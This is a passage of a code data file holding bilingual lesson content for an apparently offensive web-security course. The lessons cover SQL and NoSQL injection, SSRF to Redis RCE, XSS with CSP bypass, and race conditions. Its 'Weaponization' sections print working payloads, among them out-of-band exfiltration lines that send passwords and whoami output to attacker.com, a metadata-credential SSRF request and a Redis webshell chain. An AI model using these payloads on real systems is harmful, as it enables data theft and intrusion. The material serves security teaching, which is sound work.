                        content: '# The Architecture (المعمارية)\n\nThe database executes queries received from the app. It supports stacking queries (`;`) and outbound network requests (DNS/HTTP via UDFs or native functions).\n\n# The Flaw (الخلل)\n\n1. **Blind**: App suppresses errors, but logic changes based on True/False.\n2. **OOB**: App gives *no* feedback, but DB can send data out.\n\n# The Weaponization (تحويل الخلل لسلاح)\n\n### Basic Method\n`\' OR 1=1--`\n\n### Advanced Method (OOB)\nForce the DB to perform a DNS lookup to a domain you control, encoding the data in the subdomain.\nExample (Oracle): `SELECT ... UTL_HTTP.REQUEST(\'http://attacker.com/\'||password) ...`\n\n# The Simulation (المحاكاة)\n\n```sql\n-- PostgreSQL OOB\nCOPY (SELECT \'\') TO PROGRAM \'nslookup $(whoami).attacker.com\'\n```\n\n# War Stories (قصص واقعية)\nTesla\'s internal dashboard was breached using Blind SQLi to dump user data.'
                    }
                ]
            },
            {
                id: 'module-2', title: 'NoSQL & Polyglot', titleAr: 'NoSQL', duration: '1 week',
                lessons: [
                    {
                        id: 'lesson-1',
                        title: 'MongoDB Injection',
                        titleAr: 'حقن المونجو',
                        type: 'text',
                        duration: '1.5h',
                        content: '# The Architecture (المعمارية)\n\nMongoDB uses BSON. Queries are objects, not strings. `db.users.find({user: input})`.\n\n# The Flaw (الخلل)\n\nIf input is an object `{"$ne": null}` instead of a string, it changes the query logic (User is NOT null -> effectively always true).\n\n# The Weaponization (تحويل الخلل لسلاح)\n\n### Basic Method\nLogin Bypass: `user[$ne]=null&pass[$ne]=null`\n\n### Advanced Method (SSJS)\nInjection inside `$where` clauses allows executing full JavaScript on the DB process.\n`\' && this.password.match(/^a/.*) && \'`\n\n# The Simulation (المحاكاة)\n\n**Payload:** `{"$gt": ""}` (Greater than empty string -> Matches everything).\n\n# War Stories (قصص واقعية)\nVerizon had a NoSQL injection vulnerability in their enterprise portal.'
                    }
                ]
            },
            {
                id: 'module-3', title: 'SSRF & Redis', titleAr: 'SSRF و Redis', duration: '1 week',
                lessons: [
                    {
                        id: 'lesson-1',
                        title: 'SSRF to RCE',
                        titleAr: 'من SSRF إلى RCE',
                        type: 'text',
                        duration: '2h',
                        content: '# The Architecture (المعمارية)\n\nServers fetch resources (images, webhooks) from URLs provided by users. Redis Protocol is text-based and simple.\n\n# The Flaw (الخلل)\n\nThe server does not validate the *destination* of the request properly. It can access `localhost`, `127.0.0.1`, or internal cloud metadata (`169.254.169.254`). Redis generally lacks authentication on localhost.\n\n# The Weaponization (تحويل الخلل لسلاح)\n\n### Basic Method\nScan internal ports: `http://localhost:22`\n\n### Advanced Method (Redis RCE)\nUse Gopher protocol to send multi-line Redis commands.\n`gopher://127.0.0.1:6379/_SLAVEOF...` to replicate a rogue master and write a webshell.\n\n# The Simulation (المحاكاة)\n\n`curl http://vulnerable.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n\n# War Stories (قصص واقعية)\n**Capital One** was breached via SSRF on AWS WAF, allowing access to the EC2 Metadata Service and stealing IAM roles for S3 buckets.'
                    }
                ]
            }
        ],
        whatYouWillLearn: ['Blind SQLi', 'OOB Extraction', 'NoSQL Injection', 'SSRF to RCE']
    },

    // Track Course 3: Modern Client-Side
    {
        id: 'course-modern-client-side',
        title: 'Modern Client-Side & API Security',
        titleAr: 'أمن الواجهات الحديثة',
        instructor: 'Antigravity AI',
        level: 'expert',
        duration: '4 weeks',
        description: 'DOM XSS, API Architecture, and Race Conditions.',
        descriptionEn: 'DOM XSS, API Architecture, and Race Conditions.',
        descriptionAr: 'DOM XSS، معمارية API، و Race Conditions.',
        skills: ['DOM XSS', 'GraphQL', 'Race Conditions'],
        certificate: true,
        modules: [
            {
                id: 'module-1', title: 'DOM & XSS Evolution', titleAr: 'DOM XSS', duration: '1 week',
                lessons: [
                    {
                        id: 'lesson-1',
                        title: 'React & CSP Bypass',
                        titleAr: 'تجاوز الحماية',
                        type: 'text',
                        duration: '2h',
                        content: '# The Architecture (المعمارية)\n\nModern frameworks (React/Vue) use a Virtual DOM and auto-escape content. CSP (Content Security Policy) restricts where scripts can load from.\n\n# The Flaw (الخلل)\n\n1. **Dangerous Sinks**: Using `dangerouslySetInnerHTML` or `v-html`. 2. **CSP Gadgets**: Using allowed libraries (like AngularJS or JSONP endpoints) to execute code even with strict CSP.\n\n# The Weaponization (تحويل الخلل لسلاح)\n\n### Basic Method\n`<img src=x onerror=alert(1)>` into a sink.\n\n### Advanced Method (Gadgets)\nChaining an allowed JSONP callback to execute arbitrary JS.\n\n# The Simulation (المحاكاة)\n\n`https://trusted.com/api/jsonp?callback=alert(1)`\n\n# War Stories (قصص واقعية)\nTikTok had a DOM XSS vulnerability in their search bar.'
                    }
                ]
            },
            {
                id: 'module-2', title: 'API Architecture & Logic', titleAr: 'معمارية API', duration: '1 week',
                lessons: [
                    {
                        id: 'lesson-1',
                        title: 'Race Conditions & GraphQL',
                        titleAr: 'Race Conditions',
                        type: 'text',
                        duration: '2h',
                        content: '# The Architecture (المعمارية)\n\nAPIs handle concurrent requests. GraphQL allows querying specific data fields using a single endpoint.\n\n# The Flaw (الخلل)\n\n1. **Race Condition**: Time-of-check vs Time-of-use (TOCTOU). If two requests arrive simultaneously, they might both pass the balance check before deduction occurs.\n2. **GraphQL**: Introspection reveals the entire schema. Batching queries (`query { a:me {..}, b:me {..} }`) bypasses rate limits.\n\n# The Weaponization (تحويل الخلل لسلاح)\n\n### Basic Method\nIDOR: Change ID 100 to 101.\n\n### Advanced Method (Race Condition)\nUse **Turbo Intruder** to send 100 "apply coupon" requests in a single TCP packet. All 100 might succeed before the database updates.\n\n# The Simulation (المحاكاة)\n\n(Diagram of Parallel Requests accessing DB state)\n\n# War Stories (قصص واقعية)\nA researcher used Race Conditions to redeem a gift card multiple times on a major e-commerce platform.'
                    }
                ]
            }
        ],
        whatYouWillLearn: ['DOM Based XSS', 'CSP Bypassing', 'Race Conditions', 'GraphQL Attacks']
    }
];
